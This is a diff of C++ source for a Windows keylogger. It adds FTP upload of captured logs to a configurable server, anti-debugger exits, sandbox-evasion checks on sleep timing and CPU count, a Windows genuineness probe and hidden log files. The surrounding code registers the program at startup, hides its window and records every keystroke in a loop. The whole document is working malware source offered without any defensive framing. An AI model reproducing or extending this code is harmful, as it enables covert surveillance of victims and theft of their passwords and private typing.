@@ -5,12 +5,32 @@
 #include <string>
 #include <fstream>
 #include <VersionHelpers.h>
+#include <slpublic.h>
+
+
+#define User ""
+#define Password ""
+#define MyServer ""
+
+#define CharactersPerLog 5000
 
 #define MAX_LENGTH 1024
 
+
+#define WINDOWS_SLID                                                \
+            { 0x55c92734,                                           \
+              0xd682,                                               \
+              0x4d71,                                               \
+              { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f }    \
+}
+
+
 #pragma comment(lib, "Wininet.lib")
+#pragma comment(lib, "Slwga.lib")
+
 
 FILE* OUTPUT_FILE;
+
 
 BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
 {
@@ -51,6 +71,7 @@ BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
 
     return fSuccess;
 }
+
 
 void LogItInt(int key_stroke,std::string FileName) {
     if (key_stroke == 1 || key_stroke == 2) 
@@ -101,9 +122,37 @@ void LogItInt(int key_stroke,std::string FileName) {
     fclose(OUTPUT_FILE);
 }
 
+
+void FileSubmit(const char* localfile, const char* remotefile)
+{
+    HINTERNET hInternet;
+    HINTERNET hFtpSession;
+    hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (hInternet == NULL)
+    {
+        std::cout << "Error: " << GetLastError();
+
+    }
+    else
+    {
+        hFtpSession = InternetConnectA(hInternet, MyServer, INTERNET_DEFAULT_FTP_PORT, User, Password, INTERNET_SERVICE_FTP, 0, 0);
+        if (hFtpSession == NULL)
+        {
+            std::cout << "Error ftp: " << GetLastError();
+        }
+        else
+        {
+
+            if (FtpPutFileA(hFtpSession, localfile, remotefile, FTP_TRANSFER_TYPE_BINARY, 0));
+
+        }
+    }
+}
+
+
 void LogItChar(std::string Value, std::string FileName) {
 #ifndef debug
-    if (IsDebuggerPresent() && dbg != 0) {
+    if (IsDebuggerPresent()) {
         exit(0);
     }
 #endif
@@ -114,11 +163,12 @@ void LogItChar(std::string Value, std::string FileName) {
     File.close();
 }
 
+
 ULONG WINAPI Protect(LPVOID);
+
 
 ULONG WINAPI Protect(LPVOID Parameter) {
 
-#ifndef debug
     if (IsDebuggerPresent()){
         exit(0);
     }
@@ -137,7 +187,6 @@ ULONG WINAPI Protect(LPVOID Parameter) {
         ShowWindow(Prog, 0);
         Sleep(200);
     }
-#endif
     return 0;
 }
 
@@ -152,20 +201,33 @@ void main()
         exit(0);
     }
 
-    auto Tick = GetTickCount();
+    DWORD Tick1 = GetTickCount();
 
-    srand(Tick * GetCurrentProcessId());
+    srand(Tick1 * GetCurrentProcessId());
 
-    int Time = 600000; int Divider = rand()%10000 + 100; int DividedSleep = Time/Divider;
+#ifndef debug
 
-#ifdef debug
-    Divider = 0;
-    AllocConsole();
-#endif
+    int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;
 
     for (int j = 0; j <= Divider; j++) {
         Sleep(DividedSleep);
     }
+
+    auto PatchCheck = GetTickCount();
+
+    if (PatchCheck - Tick1 < Time - 5000) {
+        exit(1);
+    }
+
+
+    unsigned long ThreadId;
+    CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
+
+#endif
+
+Log:
+
+    DWORD Tick = GetTickCount();
 
     std::string TimeText = "Current Tick:";
     std::string ComputerText = "Host Name:";
@@ -177,6 +239,7 @@ void main()
     std::string OEMText = "OEM Number:";
     std::string CPUNumberText = "Number Of Cores:";
     std::string CPUTypeText = "CPU Type:";
+    std::string GenuineText = "Pirated Windows:";
 
     char* AppData = nullptr;
     size_t AppDataSize;
@@ -248,6 +311,7 @@ void main()
 
     std::string WindowsVersion = "Unknown";
 
+
     if (IsWindows7OrGreater())
     {
         std::string WindowsVersion = "Seven";
@@ -278,11 +342,36 @@ void main()
         std::string WindowsVersion = "Server";
     }
 
+
     SYSTEM_INFO siSysInfo;
     GetSystemInfo(&siSysInfo);
+
+#ifndef debug
+    if (siSysInfo.dwNumberOfProcessors < 2) {
+        exit(1);
+    }
+#endif
+
     std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
     std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
     std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
+
+    
+    std::string IsGenuine = "Yes";
+    CONST SLID AppId = WINDOWS_SLID;
+    SL_GENUINE_STATE GenuineState;
+    HRESULT hResult;
+
+    hResult = SLIsGenuineLocal(&AppId, &GenuineState, NULL);
+
+    if (hResult == S_OK) {
+        if (GenuineState != SL_GEN_STATE_IS_GENUINE) {
+            IsGenuine = "No";
+        }
+    }
+
+
+
 
     TimeText += LogTime;
     LogItChar(TimeText, CurrentLog);
@@ -314,28 +403,36 @@ void main()
     CPUTypeText += CPUType;
     LogItChar(CPUTypeText, CurrentLog);
 
+    GenuineText += IsGenuine;
+    LogItChar(GenuineText, CurrentLog);
+
 
     LogItChar("------------------------------------------\n",CurrentLog);
 
     SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
-    unsigned long ThreadId;
-    CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
-
-    while (1) {
-
-        int ArraySize = 10;
-
-        int KeyList = {};
 
 
-        while (1) {
-            Sleep(50);
-            for (int i = 8; i < 190; i++) {
-                if (GetAsyncKeyState(i) == -32767) {
-                    LogItInt(i, CurrentLog);
-                }
-            }
-        }
-    }
+
+    int ArraySize = 10;
+
+     int KeyList = {};
+
+
+     for (int k = 0; k < CharactersPerLog;) {
+         Sleep(50);
+         for (int i = 8; i < 190; i++) {
+             if (GetAsyncKeyState(i) == -32767) {
+                 LogItInt(i, CurrentLog);
+                 k++;
+             }
+         }
+     }
+     /*
+     std::string RemoteFile = "Log";
+     RemoteFile += LogTime;
+     RemoteFile += ".txt";
+     FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
+     */
+     goto Log;
 }
